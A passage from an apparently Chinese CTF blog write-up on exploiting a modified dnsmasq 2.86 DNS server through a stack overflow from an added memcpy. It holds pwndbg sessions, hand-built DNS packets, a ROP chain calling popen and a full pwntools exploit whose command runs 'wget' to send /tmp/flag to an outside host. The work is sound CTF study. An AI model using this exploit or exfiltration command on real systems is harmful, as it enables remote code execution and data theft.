<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b*<span class="number">0x804F444</span></span><br><span class="line">Breakpoint <span class="number">2</span> at <span class="number">0x804f444</span></span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">dns: failed to create listening socket <span class="keyword">for</span> port <span class="number">53</span>: Permission denied</span><br><span class="line">[Inferior <span class="number">1</span> (process <span class="number">7175</span>) exited with code <span class="number">02</span>]</span><br></pre></td></tr></table></figure>
<p>因为该程序是运行在端口上的，所以尝试 GDB attach，这里有几个小坑需要注意：</p>
<ul>
<li>原来 <code>start.sh</code> 中设置的所有者为 nobody，必须手动启动程序来保证所有者为自己：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dns -C ./dns.conf 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<ul>
<li>注意以下报错：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg: created $rebase, $<span class="function">ida gdb <span class="title">functions</span> <span class="params">(can be used with print/<span class="keyword">break</span>)</span></span></span><br><span class="line"><span class="function">Attaching to process 3294</span></span><br><span class="line"><span class="function">Could <span class="keyword">not</span> attach to process.  If your uid matches the uid of the target</span></span><br><span class="line"><span class="function">process, check the setting of /proc/sys/kernel/yama/ptrace_scope, <span class="keyword">or</span> <span class="keyword">try</span></span></span><br><span class="line"><span class="function">again as the root user.  For more details, see /etc/sysctl.d/10-ptrace.conf</span></span><br><span class="line"><span class="function">ptrace: 不允许的操作.</span></span><br></pre></td></tr></table></figure>
<ul>
<li>解决：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/codeblock/p/5145875.html">非root不能gdb attach的限制</a> </li>
</ul>
<p><strong>入侵思路</strong></p>
<p>先试试在 README 里面的测试样例：</p>
<p>输入：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  Master of DNS sudo ./start.sh    </span><br></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">➜  Master of DNS dig @<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -p <span class="number">9999</span> baidu.com</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG <span class="number">9.16</span><span class="number">.1</span>-Ubuntu &lt;&lt;&gt;&gt; @<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -p <span class="number">9999</span> baidu.com</span><br><span class="line">; (<span class="number">1</span> server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: <span class="number">65211</span></span><br><span class="line">;; flags: qr rd ra; QUERY: <span class="number">1</span>, ANSWER: <span class="number">2</span>, AUTHORITY: <span class="number">0</span>, ADDITIONAL: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: <span class="number">0</span>, flags:; udp: <span class="number">512</span></span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;baidu.com.			IN	A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">baidu.com.		<span class="number">405</span>	IN	A	<span class="number">110.242</span><span class="number">.68</span><span class="number">.66</span></span><br><span class="line">baidu.com.		<span class="number">405</span>	IN	A	<span class="number">39.156</span><span class="number">.66</span><span class="number">.10</span></span><br><span class="line"></span><br><span class="line">;; Query time: <span class="number">51</span> msec</span><br><span class="line">;; SERVER: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>#<span class="number">9999</span>(<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>)</span><br><span class="line">;; WHEN: 三 <span class="number">7</span>月 <span class="number">27</span> <span class="number">14</span>:<span class="number">53</span>:<span class="number">21</span> CST <span class="number">2022</span></span><br><span class="line">;; MSG SIZE  rcvd: <span class="number">70</span></span><br></pre></td></tr></table></figure>
<ul>
<li>题目文件应该是一个小型的 DNS 解析器，在端口 9999 上</li>
</ul>
<p>对于这种代码量较大的非原创程序，要么考虑出题人魔改源码，要么在网上找找这个程序的 cve，所以先尝试寻找程序的源码，然后用对比软件进行分析</p>
<p>在提示中已经给出源码地址了，但是不知道版本，一般就在 IDA 中搜索 “version”，看看能不能发现版本号</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Dns version %s\n&quot;</span>, <span class="string">&quot;2.86&quot;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>逆向分析，发现版本号为 2.86，所以直接去官网上下载源码，进行编译（32位）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://thekelleys.org.uk/dnsmasq/dnsmasq-2.86.tar.gz</span><br><span class="line">tar -zxvf dnsmasq-2.86.tar.gz</span><br><span class="line">cd dnsmasq-2.86</span><br><span class="line"><span class="meta">#</span><span class="bash"> 更改Makefile</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> CFLAGS        = -m32 -fno-stack-protector</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> LDFLAGS       = -m32 -no-pie</span></span><br><span class="line">make</span><br></pre></td></tr></table></figure>
<ul>
<li>使用 BinDiff 进行对比（<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lsdb/p/10543411.html">BinDiff安装使用教程</a>）</li>
</ul>
<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658922131840.png" alt="1658922131840"> </p>
<ul>
<li>发现相似度高达 99%，那么可能是出题人魔改了源码（当然也不排除是 libc 版本的原因），把相似度不是 100% 的几个函数都分析一下：（libc 库函数除外）</li>
</ul>
<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658924092660.png" alt="1658924092660"> </p>
<ul>
<li>sub_804F345 VS extract_name：</li>
</ul>
<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658924502529.png" alt="1658924502529"> </p>
<ul>
<li>最后在 IDA 中进行确认，发现多了个 <code>memcpy(dest, src, n)</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0804F</span>432                               loc_804F432:                            ; CODE XREF: sub_804F345+E3↑j</span><br><span class="line">.text:<span class="number">0804F</span>432 <span class="number">83</span> EC <span class="number">04</span>                      sub     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">0804F</span>435 FF <span class="number">75</span> E4                      push    [ebp+n]                         ; n</span><br><span class="line">.text:<span class="number">0804F</span>438 FF <span class="number">75</span> <span class="number">14</span>                      push    [ebp+src]                       ; src</span><br><span class="line">.text:<span class="number">0804F</span>43B <span class="number">8</span>D <span class="number">85</span> <span class="number">7F</span> FC FF FF             lea     eax, [ebp+dest]</span><br><span class="line">.text:<span class="number">0804F</span>441 <span class="number">50</span>                            push    eax                             ; dest</span><br><span class="line">.text:<span class="number">0804F</span>442 <span class="number">89</span> D3                         mov     ebx, edx</span><br><span class="line">.text:<span class="number">0804F</span>444 E8 <span class="number">17</span> B6 FF FF                call    _memcpy</span><br><span class="line">.text:<span class="number">0804F</span>444</span><br><span class="line">.text:<span class="number">0804F</span>449 <span class="number">83</span> C4 <span class="number">10</span>                      add     esp, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">0804F</span>44C <span class="number">8B</span> <span class="number">45</span> DC                      mov     eax, [ebp+var_24]</span><br><span class="line">.text:<span class="number">0804F</span>44F E9 BB <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>                jmp     loc_804F60F</span><br></pre></td></tr></table></figure>
<p>这个 <code>memcpy(dest, src, n)</code> 可能引发栈溢出，所以在 <code>0x804F444</code> 打断点进行调试</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x804f444</span>    call   <span class="built_in">memcpy</span>@plt                     &lt;<span class="built_in">memcpy</span>@plt&gt;</span><br><span class="line">       dest: <span class="number">0xffb9c707</span> ◂— <span class="number">0x9bea000</span></span><br><span class="line">       src: <span class="number">0x8e775b0</span> ◂— <span class="string">&#x27;baidu.com&#x27;</span></span><br><span class="line">       n: <span class="number">0xa</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xffb9c700</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│       <span class="number">0xffb9c700</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│ edx<span class="number">-3</span> <span class="number">0xffb9c704</span> ◂— <span class="number">0x62000000</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>│       <span class="number">0xffb9c708</span> ◂— <span class="string">&#x27;aidu.com&#x27;</span></span><br><span class="line"><span class="number">03</span>:<span class="number">000</span>c│       <span class="number">0xffb9c70c</span> ◂— <span class="string">&#x27;.com&#x27;</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│       <span class="number">0xffb9c710</span> —▸ <span class="number">0x809be00</span> ◂— <span class="string">&#x27; src/config.h&#x27;</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>│       <span class="number">0xffb9c714</span> —▸ <span class="number">0xffb9ccb8</span> —▸ <span class="number">0xffb9ce28</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│       <span class="number">0xffb9c718</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>c│       <span class="number">0xffb9c71c</span> —▸ <span class="number">0x809be28</span> ◂— <span class="number">0x706964</span> <span class="comment">/* &#x27;dip&#x27; */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ esp <span class="number">0xffb9ca8c</span> —▸ <span class="number">0x80517ae</span> ◂— add    esp, <span class="number">0x20</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│     <span class="number">0xffb9ca90</span> —▸ <span class="number">0x8e780a0</span> ◂— <span class="number">0x20019844</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>│     <span class="number">0xffb9ca94</span> ◂— <span class="number">0x32</span> <span class="comment">/* &#x27;2&#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">000</span>c│     <span class="number">0xffb9ca98</span> —▸ <span class="number">0xffb9cabc</span> —▸ <span class="number">0x8e780b7</span> ◂— <span class="number">0x1000100</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│     <span class="number">0xffb9ca9c</span> —▸ <span class="number">0x8e775b0</span> ◂— <span class="string">&#x27;baidu.com&#x27;</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>│     <span class="number">0xffb9caa0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│     <span class="number">0xffb9caa4</span> ◂— <span class="number">0x4</span></span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>c│     <span class="number">0xffb9caa8</span> —▸ <span class="number">0xffb9cbf8</span> —▸ <span class="number">0xffb9cca8</span> —▸ <span class="number">0xffb9ce28</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>理论上是可以覆盖 ret 的，先计算偏移：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance <span class="number">0xffb9ca8c</span> <span class="number">0xffb9c707</span></span><br><span class="line"><span class="number">0xffb9ca8c</span>-&gt;<span class="number">0xffb9c707</span> is <span class="number">-0x385</span> bytes (<span class="number">-0xe2</span> words)</span><br></pre></td></tr></table></figure>
<p>尝试用 dig 发送数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  Master of DNS dig @<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -p <span class="number">9999</span> baiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiidu.com</span><br><span class="line">dig: <span class="string">&#x27;baiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiidu.com&#x27;</span> <span class="function">is <span class="keyword">not</span> a legal IDNA2008 <span class="title">name</span> <span class="params">(domain label longer than <span class="number">63</span> characters)</span>, use +noidnin</span></span><br></pre></td></tr></table></figure>
<ul>
<li>尝试发送较长域名发现，dig 直接会提示过长无法发送，要求域名中每个段标签（两个点之间的字符串）长度不能超过 63 字节</li>
<li>并且总长度不能超过 255 字节</li>
</ul>
<p>尝试用 pwntools 手工构造：</p>
<ul>
<li>先进行抓包，看看 DNS 请求数据包的结构</li>
</ul>
<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1658997555648.png" alt="1658997555648">   </p>
<ul>
<li>收集数据如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>   b2 b6 <span class="number">01</span> <span class="number">20</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">05</span> <span class="number">62</span> <span class="number">61</span> <span class="number">69</span>   ... .........bai</span><br><span class="line"><span class="number">0010</span>   <span class="number">64</span> <span class="number">75</span> <span class="number">03</span> <span class="number">63</span> <span class="number">6f</span> <span class="number">6</span>d <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">29</span> <span class="number">10</span> <span class="number">00</span>   du.com.......)..</span><br><span class="line"><span class="number">0020</span>   <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">0</span>c <span class="number">00</span> <span class="number">0</span>a <span class="number">00</span> <span class="number">08</span> b2 <span class="number">7</span>c f0 b9 b1 <span class="number">3</span>a   ...........|...:</span><br><span class="line"><span class="number">0030</span>   <span class="number">81</span> e9                                             ..</span><br></pre></td></tr></table></figure>
<ul>
<li>基础结构部分：<code>b2 b6 01 20 00 01 00 00 00 00 00 01</code></li>
<li>问题部分：（域名+Type+Class）<ul>
<li>域名：<code>05 baidu 03 com 00</code> </li>
<li>Type：<code>00 01</code> </li>
<li>Class：<code>00 01</code></li>
</ul>
</li>
</ul>
<p>利用这些信息我们可以对 Header 进行伪造：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>,typ=<span class="string">&#x27;udp&#x27;</span>)</span><br><span class="line"></span><br><span class="line">head =  <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;b2b601200001000000000001&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=(<span class="string">b&#x27;\x3f&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3f</span>)*<span class="number">14</span></span><br><span class="line">payload+=<span class="string">b&#x27;\x04&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">payload+=<span class="string">b&#x27;\x04&#x27;</span>+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">end = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;00010001&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = head + payload + end</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x804f449</span>    add    esp, <span class="number">0x10</span></span><br><span class="line">  <span class="number">0x804f44c</span>    mov    eax, dword ptr [ebp - <span class="number">0x24</span>]</span><br><span class="line">  <span class="number">0x804f44f</span>    jmp    <span class="number">0x804f60f</span>                     &lt;<span class="number">0x804f60f</span>&gt;</span><br><span class="line">   ↓</span><br><span class="line">  <span class="number">0x804f60f</span>    mov    ebx, dword ptr [ebp - <span class="number">4</span>]</span><br><span class="line">  <span class="number">0x804f612</span>    leave  </span><br><span class="line">► <span class="number">0x804f613</span>    ret    &lt;<span class="number">0xdeadbeef</span>&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>已经劫持 EIP 了</li>
</ul>
<p>在写 ROP 链之前，我们先考虑怎么拿到 flag：</p>
<ul>
<li>首先肯定不能直接执行 system(“/bin/sh”) 或者 one_gadget</li>
<li>尝试用 StarCTF2022 ping 中的方法把 flag 写入 DNS 的回显信息</li>
<li>尝试用 SCTF ChristmasWishes 中的方法使用反弹 shell</li>
</ul>
<p>具体实现后发现：</p>
<ul>
<li>把 flag 写入 DNS 的回显信息可能不现实：GDB 中 search 不到 flag 的地址</li>
<li>反弹 shell 可能也行不通：程序中没有 system，好像也不能泄露 libc</li>
</ul>
<p>网上有个大佬采用 wget 来下载 flag：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 wget http://127.0.0.1:6789/ `cat /tmp/flag`</span><br><span class="line">--2022-07-28 18:09:09--  http://127.0.0.1:6789/</span><br><span class="line">正在连接 127.0.0.1:6789... 失败：拒绝连接。</span><br><span class="line">--2022-07-28 18:09:09--  http://flag%7Byhellow%7D/</span><br><span class="line">正在解析主机 flag&#123;yhellow&#125; (flag&#123;yhellow&#125;)... 失败：未知的名称或服务。</span><br><span class="line">wget: 无法解析主机地址 “flag&#123;yhellow&#125;”</span><br></pre></td></tr></table></figure>
<ul>
<li>报错了，可能是本机上的环境不匹配</li>
</ul>
<p>程序没有 system 但是有 popen，大佬利用了如下的 ROP：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 0x08059d44 : pop eax ; ret</span></span><br><span class="line"><span class="comment"># 0x08094d60 : add eax, 0x11038 ; nop ; pop ebp ; ret</span></span><br><span class="line"><span class="comment"># 0x0804b639 : add eax, edx ; add esp, 0x10 ; pop ebx ; pop ebp ; ret</span></span><br><span class="line"><span class="comment"># 0x0807ec72 : pop edx ; ret</span></span><br><span class="line"></span><br><span class="line">rop  = p32(<span class="number">0x08059d44</span>)      <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop += p32(<span class="number">0xff83fca0</span>)      <span class="comment"># 0xfffef38d + 0x11038 = 0x3c5, eax = edx + 0x3c5, eax will point to cmd </span></span><br><span class="line">rop += p32(<span class="number">0x08094d60</span>)      <span class="comment"># add eax, 0x11038 ; nop ; pop ebp ; ret</span></span><br><span class="line">rop += p32(<span class="number">0x11223344</span>)      <span class="comment"># padding</span></span><br><span class="line">rop += p32(<span class="number">0x0804b639</span>)      <span class="comment"># add eax, edx ; add esp, 0x10 ; pop ebx ; pop ebp ; ret</span></span><br><span class="line">rop += p32(<span class="number">0x11223344</span>) * <span class="number">6</span>  <span class="comment"># padding</span></span><br><span class="line">rop += p32(<span class="number">0x0807ec72</span>)      <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop += p32(<span class="number">0x0809C7B2</span>)      <span class="comment"># string r</span></span><br><span class="line">rop += p32(<span class="number">0x08071802</span>)      <span class="comment"># push edx(r) ; push eax(cmd) ; call popen</span></span><br></pre></td></tr></table></figure>
<ul>
<li>我也想写一个 ROP，但是没有合适的 gadget，感觉就是大佬的这个最好用</li>
</ul>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x8071804</span>    call   popen@plt                     &lt;popen@plt&gt;</span><br><span class="line">       command: <span class="number">0xffcfd3ac</span> ◂— <span class="string">&#x27;wget http://127\\x2e0\\x2e0\\x2e1:6789/ `cat /tmp/flag`&#x27;</span></span><br><span class="line">       modes: <span class="number">0x809c7b2</span> ◂— <span class="number">0x2b610072</span> <span class="comment">/* &#x27;r&#x27; */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> ni</span></span><br><span class="line">[Attaching after process 4156 vfork to child process 4585]</span><br><span class="line">[New inferior 2 (process 4585)]</span><br><span class="line">[Detaching vfork parent process 4156 after child exec]</span><br><span class="line">[Inferior 1 (process 4156) detached]</span><br><span class="line">process 4585 is executing new program: /usr/bin/dash</span><br><span class="line">Warning:</span><br><span class="line">Cannot insert breakpoint 1.</span><br><span class="line">Cannot access memory at address 0x804f444</span><br></pre></td></tr></table></figure>
<p><img src="/2022/07/28/DNS%E5%8D%8F%E8%AE%AE+BinDiff%E7%9A%84%E4%BD%BF%E7%94%A8/1659009039630.png" alt="1659009039630"> </p>
<ul>
<li>已经可以看见 popen 生成的进程了</li>
</ul>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>,typ=<span class="string">&#x27;udp&#x27;</span>)</span><br><span class="line"></span><br><span class="line">vps = <span class="string">b&quot;127.0.0.1:6789&quot;</span></span><br><span class="line">cmd = <span class="string">b&quot;wget http://%s/ `cat /tmp/flag`&quot;</span> % (vps.replace(<span class="string">b&#x27;.&#x27;</span>,<span class="string">b&#x27;\\x2e&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x08059d44 : pop eax ; ret</span></span><br><span class="line"><span class="comment"># 0x08094d60 : add eax, 0x11038 ; nop ; pop ebp ; ret</span></span><br><span class="line"><span class="comment"># 0x0804b639 : add eax, edx ; add esp, 0x10 ; pop ebx ; pop ebp ; ret</span></span><br><span class="line"><span class="comment"># 0x0807ec72 : pop edx ; ret</span></span><br><span class="line"></span><br><span class="line">rop  = p32(<span class="number">0x08059d44</span>)      <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop += p32(<span class="number">0xfffef38d</span>)      <span class="comment"># 0xfffef38d + 0x11038 = 0x3c5, eax = edx + 0x3c5, eax will point to cmd </span></span><br><span class="line">rop += p32(<span class="number">0x08094d60</span>)      <span class="comment"># add eax, 0x11038 ; nop ; pop ebp ; ret</span></span><br><span class="line">rop += p32(<span class="number">0x11223344</span>)      <span class="comment"># padding</span></span><br><span class="line">rop += p32(<span class="number">0x0804b639</span>)      <span class="comment"># add eax, edx ; add esp, 0x10 ; pop ebx ; pop ebp ; ret</span></span><br><span class="line">rop += p32(<span class="number">0x11223344</span>) * <span class="number">6</span>  <span class="comment"># padding</span></span><br><span class="line">rop += p32(<span class="number">0x0807ec72</span>)      <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop += p32(<span class="number">0x0809C7B2</span>)      <span class="comment"># string r</span></span><br><span class="line">rop += p32(<span class="number">0x08071802</span>)      <span class="comment"># push edx(r) ; push eax(cmd) ; call popen</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(rop)) <span class="comment"># len(rop) &lt; 63</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(cmd)) <span class="comment"># len(cmd) &lt; 59)</span></span><br><span class="line"></span><br><span class="line">payload   = (<span class="string">b&#x27;\x3f&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3f</span>) * <span class="number">14</span></span><br><span class="line">payload  +=  <span class="string">b&#x27;\x04&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">payload  +=  <span class="string">b&#x27;\x3f&#x27;</span>+rop.ljust(<span class="number">0x3f</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload  +=  <span class="built_in">chr</span>(<span class="built_in">len</span>(cmd)).encode() + cmd</span><br><span class="line">payload  +=  <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">head = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;000001200001000000000001&quot;</span>)</span><br><span class="line">end  = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;00010001&quot;</span>)</span><br><span class="line">io.send(head+payload+end)</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>可能是因为环境的问题，我没法拿到 flag，但 popen 应该是成功执行了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/26/fuzz%E5%9C%A8heap%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8+UAF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
